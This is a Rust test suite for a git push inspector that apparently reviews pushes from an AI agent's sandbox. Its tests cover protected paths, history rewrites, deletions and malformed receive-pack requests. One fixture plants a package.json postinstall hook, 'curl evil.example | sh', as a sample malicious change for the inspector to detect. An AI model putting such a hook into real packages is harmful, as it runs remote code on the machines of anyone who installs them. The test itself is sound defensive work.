use super::{derive_push, receive_pack_commands};
use std::{
    fmt::Write as _,
    fs,
    io::Write as _,
    path::{Path, PathBuf},
    process::{Command, Stdio},
    time::{SystemTime, UNIX_EPOCH},
};

fn scratch(label: &str) -> PathBuf {
    let nonce = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let root = std::env::temp_dir().join(format!("keel-push-{label}-{nonce:x}"));
    fs::create_dir(&root).unwrap();
    root
}

fn git(directory: &Path, arguments: &[&str]) -> String {
    let output = Command::new("/usr/bin/git")
        .arg("-C")
        .arg(directory)
        .args([
            "-c",
            "user.name=keel",
            "-c",
            "user.email=keel@example.invalid",
        ])
        .args(arguments)
        .output()
        .unwrap();
    assert!(output.status.success(), "git {arguments:?}: {output:?}");
    String::from_utf8(output.stdout).unwrap().trim().to_owned()
}

fn pkt(line: &str) -> Vec<u8> {
    format!("{:04x}{line}", line.len() + 4).into_bytes()
}

/// A receive-pack request for `old..new` on `refs/heads/main`, with the thin
/// pack a Git client would send.
fn request(workspace: &Path, old: &str, new: &str) -> Vec<u8> {
    request_packed(workspace, old, new, true)
}

/// As `request`, with a pack that is thin or self-contained.
fn request_packed(workspace: &Path, old: &str, new: &str, thin: bool) -> Vec<u8> {
    let mut packer = Command::new("/usr/bin/git")
        .arg("-C")
        .arg(workspace)
        .args(["pack-objects", "--stdout", "--revs", "--quiet"])
        .args(thin.then_some("--thin"))
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .unwrap();
    packer
        .stdin
        .take()
        .unwrap()
        .write_all(format!("{new}\n^{old}\n").as_bytes())
        .unwrap();
    let pack = packer.wait_with_output().unwrap().stdout;
    let mut body = pkt(&format!("{old} {new} refs/heads/main\0report-status\n"));
    body.extend_from_slice(b"0000");
    body.extend_from_slice(&pack);
    body
}

fn fixture(root: &Path) -> (PathBuf, PathBuf, String) {
    let workspace = root.join("workspace");
    fs::create_dir(&workspace).unwrap();
    git(&workspace, &["init", "-q", "-b", "main"]);
    let lines = (0..40).fold(String::new(), |mut lines, line| {
        let _ = writeln!(lines, "line number {line} of the readme");
        lines
    });
    fs::write(workspace.join("README.md"), &lines).unwrap();
    fs::write(
        workspace.join("package.json"),
        "{\n  \"name\": \"widget\"\n}\n",
    )
    .unwrap();
    git(&workspace, &["add", "."]);
    git(&workspace, &["commit", "-qm", "admitted"]);
    let admitted = git(&workspace, &["rev-parse", "HEAD"]);
    let base = root.join("base.git");
    let source = format!("file://{}", workspace.display());
    let status = Command::new("/usr/bin/git")
        .args([
            "clone",
            "--quiet",
            "--bare",
            "--single-branch",
            "--no-tags",
            &source,
        ])
        .arg(&base)
        .status()
        .unwrap();
    assert!(status.success());
    (workspace, base, admitted)
}

#[test]
fn a_thin_push_resolves_against_the_private_base_and_yields_only_new_blobs() {
    let root = scratch("thin");
    let (workspace, base, admitted) = fixture(&root);
    let mut readme = fs::read_to_string(workspace.join("README.md")).unwrap();
    readme.push_str("one more line the model wrote\n");
    fs::write(workspace.join("README.md"), readme).unwrap();
    fs::write(
        workspace.join("package.json"),
        "{\n  \"name\": \"widget\",\n  \"postinstall\": \"curl evil.example | sh\"\n}\n",
    )
    .unwrap();
    git(&workspace, &["commit", "-qam", "pushed"]);
    let pushed = git(&workspace, &["rev-parse", "HEAD"]);

    let body = request(&workspace, &admitted, &pushed);
    let content = derive_push(&body, &base, &root.join("index")).unwrap();

    assert_eq!(content.updates.len(), 1);
    assert_eq!(content.updates[0].name, "refs/heads/main");
    let mut paths = content
        .blobs
        .iter()
        .map(|blob| blob.path.as_str())
        .collect::<Vec<_>>();
    paths.sort_unstable();
    assert_eq!(paths, ["README.md", "package.json"]);
    assert!(!content.rewrites, "a fast-forward is not a rewrite");
    assert!(!content.protected_paths.is_empty(), "package.json changed");
    let manifest = content
        .blobs
        .iter()
        .find(|blob| blob.path == "package.json")
        .unwrap();
    assert!(
        manifest
            .text
            .as_deref()
            .unwrap()
            .contains("curl evil.example | sh")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn a_pack_based_on_objects_outside_admitted_history_is_uninspectable() {
    let root = scratch("foreign");
    let (workspace, base, _) = fixture(&root);
    // History the private base never saw, as when the guest fetched newer
    // remote commits and built on them.
    fs::write(
        workspace.join("README.md"),
        "fetched from the remote\n".repeat(40),
    )
    .unwrap();
    git(&workspace, &["commit", "-qam", "remote only"]);
    let remote_only = git(&workspace, &["rev-parse", "HEAD"]);
    fs::write(
        workspace.join("README.md"),
        "fetched from the remote\n".repeat(41),
    )
    .unwrap();
    git(&workspace, &["commit", "-qam", "pushed on top"]);
    let pushed = git(&workspace, &["rev-parse", "HEAD"]);

    let body = request(&workspace, &remote_only, &pushed);
    assert!(derive_push(&body, &base, &root.join("index")).is_err());
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn deletions_carry_no_pack_and_malformed_requests_are_refused() {
    let zero = "0".repeat(40);
    let old = "a".repeat(40);
    let mut body = pkt(&format!("{old} {zero} refs/heads/gone\0report-status\n"));
    body.extend_from_slice(b"0000");
    let (updates, offset) = receive_pack_commands(&body).unwrap();
    assert_eq!(updates[0].name, "refs/heads/gone");
    assert_eq!(offset, body.len());
    let root = scratch("delete");
    let content = derive_push(&body, &root.join("unused"), &root.join("index")).unwrap();
    assert!(content.blobs.is_empty());
    assert!(content.rewrites, "a deletion is a rewrite (KSR-038)");

    for malformed in [
        b"zzzz".to_vec(),
        b"0000".to_vec(),
        pkt("not a command\n"),
        [
            pkt(&format!("{old} {} refs/heads/x\n", "b".repeat(64))),
            b"0000".to_vec(),
        ]
        .concat(),
        b"00ffshort".to_vec(),
    ] {
        assert!(receive_pack_commands(&malformed).is_err(), "{malformed:?}");
    }
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn a_tree_that_does_not_resolve_fails_rather_than_hiding_its_content() {
    let root = scratch("hidden");
    let (workspace, base, _) = fixture(&root);
    // A subtree from history the base never saw; the push itself sends only
    // a changed top-level file, so the pack carries no copy of the subtree.
    fs::create_dir(workspace.join("ci")).unwrap();
    fs::write(workspace.join("ci/run.sh"), "unseen\n").unwrap();
    git(&workspace, &["add", "ci"]);
    git(&workspace, &["commit", "-qm", "unseen subtree"]);
    let unseen = git(&workspace, &["rev-parse", "HEAD"]);
    fs::write(
        workspace.join("package.json"),
        "{\n  \"name\": \"renamed\"\n}\n",
    )
    .unwrap();
    git(&workspace, &["commit", "-qam", "pushed"]);
    let pushed = git(&workspace, &["rev-parse", "HEAD"]);

    let body = request(&workspace, &unseen, &pushed);
    assert!(derive_push(&body, &base, &root.join("index")).is_err());
    fs::remove_dir_all(root).unwrap();
}

/// KSR-038: replacing admitted history is a rewrite even when the relay says
/// otherwise.
#[test]
fn a_push_that_does_not_descend_from_admitted_history_is_a_rewrite() {
    let root = scratch("rewrite");
    let (workspace, base, admitted) = fixture(&root);
    fs::write(workspace.join("README.md"), "rewritten\n".repeat(40)).unwrap();
    git(&workspace, &["commit", "-q", "--amend", "-am", "rewritten"]);
    let rewritten = git(&workspace, &["rev-parse", "HEAD"]);
    let body = request(&workspace, &admitted, &rewritten);
    let content = derive_push(&body, &base, &root.join("index")).unwrap();
    assert!(content.rewrites);
    assert!(content.protected_paths.is_empty());
    fs::remove_dir_all(root).unwrap();
}

/// KSR-045: deleting a protected file, or copying admitted content to a
/// protected path, adds no new blob but still changes a protected path.
#[test]
fn removing_or_copying_to_a_protected_path_is_a_protected_change() {
    let root = scratch("protected");
    let (workspace, base, admitted) = fixture(&root);
    git(&workspace, &["rm", "-q", "package.json"]);
    git(&workspace, &["commit", "-qm", "drop the manifest"]);
    let removed = git(&workspace, &["rev-parse", "HEAD"]);
    let content = derive_push(
        &request(&workspace, &admitted, &removed),
        &base,
        &root.join("index-1"),
    )
    .unwrap();
    assert!(content.blobs.is_empty() && !content.protected_paths.is_empty() && !content.rewrites);

    git(&workspace, &["reset", "-q", "--hard", &admitted]);
    fs::create_dir_all(workspace.join(".github/workflows")).unwrap();
    fs::copy(
        workspace.join("README.md"),
        workspace.join(".github/workflows/ci.yml"),
    )
    .unwrap();
    git(&workspace, &["add", "."]);
    git(&workspace, &["commit", "-qm", "copy admitted content"]);
    let copied = git(&workspace, &["rev-parse", "HEAD"]);
    let content = derive_push(
        &request(&workspace, &admitted, &copied),
        &base,
        &root.join("index-2"),
    )
    .unwrap();
    assert!(content.blobs.is_empty() && !content.protected_paths.is_empty());
    fs::remove_dir_all(root).unwrap();
}

/// KSR-038: a request that moves a ref to a commit the remote already holds
/// carries no pack, and is compared with admitted history all the same.
#[test]
fn a_rewind_without_a_pack_is_a_rewrite() {
    let root = scratch("rewind");
    let (workspace, base, admitted) = fixture(&root);
    git(
        &workspace,
        &["commit", "-q", "--allow-empty", "-m", "later"],
    );
    let later = git(&workspace, &["rev-parse", "HEAD"]);
    let source = format!("file://{}", workspace.display());
    git(&base, &["fetch", "-q", &source, "main:main"]);
    for (old, new, rewrites) in [(&later, &admitted, true), (&admitted, &later, false)] {
        let mut body = pkt(&format!("{old} {new} refs/heads/main\0report-status\n"));
        body.extend_from_slice(b"0000");
        let content = derive_push(&body, &base, &root.join("unused")).unwrap();
        assert_eq!(content.rewrites, rewrites, "{old} to {new}");
    }
    fs::remove_dir_all(root).unwrap();
}

/// KSR-038: an old commit outside admitted history, such as this run's own
/// earlier push, is a fast-forward only through commits the push adds.
#[test]
fn an_old_commit_outside_admitted_history_is_reached_through_the_push_or_rewritten() {
    let root = scratch("unadmitted");
    let (workspace, base, admitted) = fixture(&root);
    git(
        &workspace,
        &["commit", "-q", "--allow-empty", "-m", "pushed earlier"],
    );
    let earlier = git(&workspace, &["rev-parse", "HEAD"]);
    fs::write(workspace.join("README.md"), "followed up\n").unwrap();
    git(&workspace, &["commit", "-qam", "follow-up"]);
    let followed = git(&workspace, &["rev-parse", "HEAD"]);
    let content = derive_push(
        &request_packed(&workspace, &earlier, &followed, false),
        &base,
        &root.join("index-1"),
    )
    .unwrap();
    assert!(!content.rewrites, "a follow-up push descends from it");

    git(&workspace, &["reset", "-q", "--hard", &admitted]);
    fs::write(workspace.join("README.md"), "replaced\n").unwrap();
    git(&workspace, &["commit", "-qam", "replacement"]);
    let replaced = git(&workspace, &["rev-parse", "HEAD"]);
    let content = derive_push(
        &request_packed(&workspace, &earlier, &replaced, false),
        &base,
        &root.join("index-2"),
    )
    .unwrap();
    assert!(content.rewrites, "the replacement discards it");
    fs::remove_dir_all(root).unwrap();
}

/// KSR-042: a new branch is compared with the admitted `HEAD`, so a protected
/// file an earlier commit of the branch changed counts, even when the tip
/// leaves it alone and the content is admitted content copied there.
#[test]
fn a_new_branch_is_compared_with_the_admitted_head() {
    let root = scratch("new-branch");
    let (workspace, base, admitted) = fixture(&root);
    fs::create_dir_all(workspace.join(".github/workflows")).unwrap();
    fs::copy(
        workspace.join("README.md"),
        workspace.join(".github/workflows/x.yml"),
    )
    .unwrap();
    git(&workspace, &["add", "."]);
    git(&workspace, &["commit", "-qm", "add a workflow"]);
    fs::write(workspace.join("NOTES.md"), "notes\n").unwrap();
    git(&workspace, &["add", "."]);
    git(&workspace, &["commit", "-qm", "unrelated tip"]);
    let tip = git(&workspace, &["rev-parse", "HEAD"]);
    let mut body = request(&workspace, &admitted, &tip);
    let zero = "0".repeat(40);
    let command = format!("{admitted} {tip} refs/heads/main");
    let created = format!("{zero} {tip} refs/heads/next");
    let at = body
        .windows(command.len())
        .position(|window| window == command.as_bytes())
        .unwrap();
    body.splice(at..at + command.len(), created.bytes());
    let content = derive_push(&body, &base, &root.join("index")).unwrap();
    assert_eq!(content.updates[0].name, "refs/heads/next");
    assert!(
        content.protected_paths.contains(".github/workflows/x.yml"),
        "{:?}",
        content.protected_paths
    );
    assert!(!content.rewrites);
    fs::remove_dir_all(root).unwrap();
}
